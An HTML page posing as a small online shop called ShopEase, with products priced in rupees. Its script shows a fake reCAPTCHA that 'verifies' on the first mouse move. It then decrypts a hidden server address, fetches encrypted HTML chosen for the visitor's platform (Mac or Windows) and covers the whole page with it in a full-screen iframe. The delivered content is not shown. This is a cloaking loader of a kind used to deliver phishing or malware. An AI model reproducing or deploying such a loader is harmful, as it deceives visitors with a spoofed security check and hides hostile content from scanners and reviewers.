<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>ShopEase</title>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.2.0/crypto-js.min.js"></script>
  <style>
    * { box-sizing: border-box; }
    html, body { margin: 0; height: 100%; }
    body { font-family: system-ui, -apple-system, "Segoe UI", sans-serif; color: #1f2433; background: #f6f7fb; }
    a { text-decoration: none; color: inherit; }
    #frame { display: none; width: 100%; height: 100vh; border: 0; }
    .hint { text-align: center; padding: 8px; font-size: .85rem; color: #6d28d9; background: #ede9fe; }

    /* ===== "I'm not a robot" popup (auto-verify, no real logic) ===== */
    .cap-overlay { position: fixed; inset: 0; background: rgba(0,0,0,.45); z-index: 100;
                   display: flex; align-items: center; justify-content: center; transition: opacity .4s; }
    .cap-overlay.hide { opacity: 0; pointer-events: none; }
    .cap-card { background: #fff; border-radius: 12px; box-shadow: 0 20px 60px rgba(0,0,0,.3);
                padding: 22px; width: 320px; max-width: 90vw; font-family: system-ui, sans-serif; }
    .cap-card h4 { margin: 0 0 14px; font-size: 1rem; color: #333; }
    .cap-box { display: flex; align-items: center; gap: 12px; border: 1px solid #d3d3d3;
               border-radius: 4px; padding: 12px 14px; background: #f9f9f9; }
    .cap-check { width: 28px; height: 28px; flex: none; border: 2px solid #c1c1c1; border-radius: 3px;
                 background: #fff; display: flex; align-items: center; justify-content: center; }
    .cap-spinner { width: 20px; height: 20px; border: 3px solid #c1c1c1; border-top-color: #4285f4;
                   border-radius: 50%; animation: capspin .7s linear infinite; }
    @keyframes capspin { to { transform: rotate(360deg); } }
    .cap-tick { display: none; color: #1a73e8; font-size: 20px; font-weight: 700; line-height: 1; }
    .cap-label { font-size: .95rem; color: #444; }
    .cap-logo { margin-left: auto; text-align: center; color: #9aa0a6; }
    .cap-logo .ic { font-size: 1.3rem; }
    .cap-logo small { display: block; font-size: .6rem; letter-spacing: .5px; }
    .cap-status { margin-top: 12px; font-size: .82rem; color: #888; text-align: center; }
    .cap-status.ok { color: #16a34a; font-weight: 600; }

    .nav { position: sticky; top: 0; z-index: 10; display: flex; align-items: center; gap: 20px;
           padding: 14px 28px; background: #fff; box-shadow: 0 1px 8px rgba(0,0,0,.06); }
    .brand { font-size: 1.25rem; font-weight: 800; color: #6d28d9; }
    .links { display: flex; gap: 18px; margin-left: 8px; }
    .links a { font-size: .92rem; color: #555; }
    .links a:hover { color: #6d28d9; }
    .clock { margin-left: auto; font-size: .8rem; color: #6d28d9; font-weight: 600;
             background: #f3e8ff; padding: 5px 12px; border-radius: 20px; white-space: nowrap; }
    .cart-btn { border: 0; cursor: pointer; background: #6d28d9; color: #fff; font-weight: 600;
                padding: 9px 16px; border-radius: 30px; font-size: .9rem; }
    .cart-btn .badge { background: #fff; color: #6d28d9; border-radius: 20px; padding: 0 7px;
                       margin-left: 4px; font-size: .8rem; font-weight: 800; }

    .hero { display: flex; align-items: center; gap: 32px; flex-wrap: wrap; padding: 48px 28px;
            background: linear-gradient(135deg, #ede9fe, #f5f3ff); }
    .hero-text { flex: 1 1 320px; }
    .hero-text h1 { font-size: 2.1rem; margin: 0 0 12px; line-height: 1.2; }
    .hero-text h1 span { color: #db2777; }
    .hero-text p { color: #555; max-width: 460px; }
    .cta { display: inline-block; margin-top: 14px; background: #db2777; color: #fff;
           font-weight: 700; padding: 12px 26px; border-radius: 30px; }
    .cta:hover { background: #be185d; }
    .hero-img { flex: 1 1 320px; max-width: 520px; width: 100%; border-radius: 16px;
                box-shadow: 0 12px 30px rgba(0,0,0,.15); }

    .section-title { text-align: center; font-size: 1.5rem; margin: 40px 0 6px; }

    .grid { display: grid; gap: 22px; grid-template-columns: repeat(auto-fill, minmax(220px, 1fr));
            padding: 24px 28px 10px; }
    .card { background: #fff; border-radius: 14px; overflow: hidden; box-shadow: 0 4px 16px rgba(0,0,0,.07);
            transition: transform .15s, box-shadow .15s; }
    .card:hover { transform: translateY(-4px); box-shadow: 0 10px 26px rgba(0,0,0,.12); }
    .card img { width: 100%; height: 170px; object-fit: cover; display: block; }
    .card .body { padding: 14px 16px 18px; }
    .card h3 { margin: 0 0 4px; font-size: 1rem; }
    .card .price { color: #6d28d9; font-weight: 800; font-size: 1.05rem; }
    .card .old { color: #aaa; text-decoration: line-through; font-size: .85rem; margin-left: 6px; font-weight: 500; }
    .add { margin-top: 10px; width: 100%; cursor: pointer; border: 0; background: #1f2433; color: #fff;
           font-weight: 600; padding: 10px; border-radius: 8px; font-size: .9rem; }
    .add:hover { background: #6d28d9; }

    .about { padding: 10px 28px 30px; }
    .features { display: flex; gap: 20px; flex-wrap: wrap; justify-content: center; margin-top: 14px; }
    .feature { background: #fff; border-radius: 14px; padding: 22px; flex: 1 1 200px; max-width: 260px;
               text-align: center; box-shadow: 0 4px 14px rgba(0,0,0,.06); }
    .feature span { font-size: 1.8rem; }
    .feature h3 { margin: 8px 0 4px; font-size: 1rem; }
    .feature p { margin: 0; color: #666; font-size: .88rem; }

    .footer { text-align: center; padding: 24px; color: #888; font-size: .85rem; }
  </style>
</head>
<body>
  <!-- ===== "I'm not a robot" popup (auto-verifies, no real logic) ===== -->
  <div class="cap-overlay" id="capOverlay">
    <div class="cap-card">
      <h4>Quick security check</h4>
      <div class="cap-box">
        <div class="cap-check">
          <div class="cap-spinner" id="capSpinner"></div>
          <span class="cap-tick" id="capTick">✓</span>
        </div>
        <span class="cap-label">I'm not a robot</span>
        <div class="cap-logo"><div class="ic">🛡️</div><small>reCAPTCHA</small></div>
      </div>
      <div class="cap-status" id="capStatus">Verifying…</div>
    </div>
  </div>

  <!-- ===== STATIC SHOP (HTML + CSS): shown before the mouse moves ===== -->
  <div id="shop">
  <div class="hint">🖱️ Move the mouse — the encrypted version will load in the iframe</div>
  <!-- ===== Header ===== -->
  <header class="nav">
    <div class="brand">🛍️ ShopEase</div>
    <nav class="links">
      <a href="#home">Home</a>
      <a href="#products">Products</a>
      <a href="#about">About</a>
    </nav>
    <span class="clock">🕒 Mon, 29 Jun 2026</span>
    <button class="cart-btn">🛒 Cart <span class="badge">0</span></button>
  </header>

  <!-- ===== Hero ===== -->
  <section class="hero" id="home">
    <div class="hero-text">
      <h1>Summer Sale — up to <span>50% OFF</span></h1>
      <p>Trendy products, free stock photos, ek hi page par.
         Pure HTML + CSS single-page store. ✨</p>
      <a href="#products" class="cta">Shop now</a>
    </div>
    <img class="hero-img" src="https://picsum.photos/seed/shopfashion/520/360" alt="hero" />
  </section>

  <!-- ===== Products (static HTML) ===== -->
  <section id="products">
    <h2 class="section-title">Featured Products</h2>
    <div class="grid">
      <div class="card">
        <img src="https://picsum.photos/seed/sneakers/400/300" alt="Running Sneakers" />
        <div class="body">
          <h3>Running Sneakers</h3>
          <div class="price">₹2,499 <span class="old">₹3,999</span></div>
          <button class="add">Add to cart</button>
        </div>
      </div>
      <div class="card">
        <img src="https://picsum.photos/seed/watch/400/300" alt="Classic Watch" />
        <div class="body">
          <h3>Classic Watch</h3>
          <div class="price">₹4,999 <span class="old">₹7,499</span></div>
          <button class="add">Add to cart</button>
        </div>
      </div>
      <div class="card">
        <img src="https://picsum.photos/seed/backpack/400/300" alt="Travel Backpack" />
        <div class="body">
          <h3>Travel Backpack</h3>
          <div class="price">₹1,899 <span class="old">₹2,999</span></div>
          <button class="add">Add to cart</button>
        </div>
      </div>
      <div class="card">
        <img src="https://picsum.photos/seed/headphones/400/300" alt="Wireless Headphones" />
        <div class="body">
          <h3>Wireless Headphones</h3>
          <div class="price">₹3,299 <span class="old">₹4,999</span></div>
          <button class="add">Add to cart</button>
        </div>
      </div>
      <div class="card">
        <img src="https://picsum.photos/seed/sunglasses/400/300" alt="Sunglasses" />
        <div class="body">
          <h3>Sunglasses</h3>
          <div class="price">₹999 <span class="old">₹1,799</span></div>
          <button class="add">Add to cart</button>
        </div>
      </div>
      <div class="card">
        <img src="https://picsum.photos/seed/camera/400/300" alt="Instant Camera" />
        <div class="body">
          <h3>Instant Camera</h3>
          <div class="price">₹5,999 <span class="old">₹8,499</span></div>
          <button class="add">Add to cart</button>
        </div>
      </div>
    </div>
  </section>

  <!-- ===== About ===== -->
  <section id="about" class="about">
    <h2 class="section-title">Why ShopEase?</h2>
    <div class="features">
      <div class="feature"><span>🚚</span><h3>Free Shipping</h3><p>₹499 se upar free delivery.</p></div>
      <div class="feature"><span>↩️</span><h3>Easy Returns</h3><p>7-day no-question return.</p></div>
      <div class="feature"><span>🔒</span><h3>Secure</h3><p>Safe & secure checkout.</p></div>
    </div>
  </section>

  <footer class="footer">© 2026 ShopEase · Single-page demo store · Images: picsum.photos</footer>
  </div><!-- /#shop -->

  <!-- ===== Encrypted shop iframe (shown after the mouse moves) ===== -->
  <iframe id="frame" title="encrypted shop" allowfullscreen allow="fullscreen"></iframe>

  <!-- Only the iframe-loading logic (the shop's own JS has been removed) -->
  <script>
    /* ---------- "I'm not a robot" popup: verifies + disappears on mouse move ---------- */
    function verifyCaptcha() {
      const overlay = document.getElementById("capOverlay");
      const spinner = document.getElementById("capSpinner");
      const tick = document.getElementById("capTick");
      const status = document.getElementById("capStatus");
      spinner.style.display = "none";
      tick.style.display = "block";
      status.textContent = "Verified ✓";
      status.classList.add("ok");
      setTimeout(() => overlay.classList.add("hide"), 400);   // popup hat jata hai
    }

    const PASSPHRASE = "98yNCjeAfWMwk0wI";   // 16-char key (must match server PASSPHRASE)

    // DATA server origin — encrypted (obfuscation only, not real security).
    // Made with: CryptoJS.AES.encrypt("https://node.intellectpath.net", URL_KEY)
    // Local dev me chahiye to ENC_DATA_ORIGIN ki jagah seedha "http://localhost:5002" daal do.
    const URL_KEY = "UrLk3yShopEase01";
    const ENC_DATA_ORIGIN = "U2FsdGVkX1+eeP3rYck3awlh7p+cRXntKEBc5PvRG/WJ+Xsr5AzdM+Jr8jkEOCHS";
    const DATA_ORIGIN = CryptoJS.AES.decrypt(ENC_DATA_ORIGIN, URL_KEY).toString(CryptoJS.enc.Utf8);
    const DATA_URL = DATA_ORIGIN + "/data";
    let lastUrl = null;

    function detectPlatform() {
      const p = (navigator.userAgentData && navigator.userAgentData.platform) ||
                navigator.platform || navigator.userAgent || "";
      return /mac/i.test(p) ? "mac" : "win";
    }

    async function loadSecret() {
      const shop = document.getElementById("shop");
      try {
        if (document.getElementById("secretDiv")) return;   // ek hi baar
        const res = await fetch(DATA_URL + "?platform=" + detectPlatform());
        const { cipher } = await res.json();
        const html = CryptoJS.AES.decrypt(cipher, PASSPHRASE).toString(CryptoJS.enc.Utf8);
        if (!html) throw new Error("Decrypt failed — wrong key?");

        const blobUrl = URL.createObjectURL(new Blob([html], { type: "text/html" }));

        // Working code jaisa: iframe DYNAMICALLY banao, src set karo, PHIR DOM me daalo.
        // Safari me static/already-in-DOM iframe ka blob src reliably load nahi hota;
        // fresh iframe jo src ke saath DOM me enter kare, woh load ho jaata hai.
        const div = document.createElement("div");
        div.id = "secretDiv";
        div.style.cssText = "position:fixed;inset:0;z-index:2147483647;background:#fff;";
        const iframe = document.createElement("iframe");
        iframe.src = blobUrl;
        iframe.style.cssText = "width:100%;height:100%;border:0;display:block;";
        iframe.setAttribute("allow", "fullscreen");
        iframe.allowFullscreen = true;
        iframe.onload = () => URL.revokeObjectURL(blobUrl);
        div.appendChild(iframe);
        shop.style.display = "none";
        document.body.appendChild(div);
      } catch (e) {
        document.querySelector(".hint").textContent = "⚠️ " + e.message;
      }
    }

    // On first mouse move: captcha verifies + disappears, then encrypted shop loads.
    window.addEventListener("mousemove", () => {
      verifyCaptcha();
      loadSecret();
    }, { once: true });
  </script>
</body>
</html>
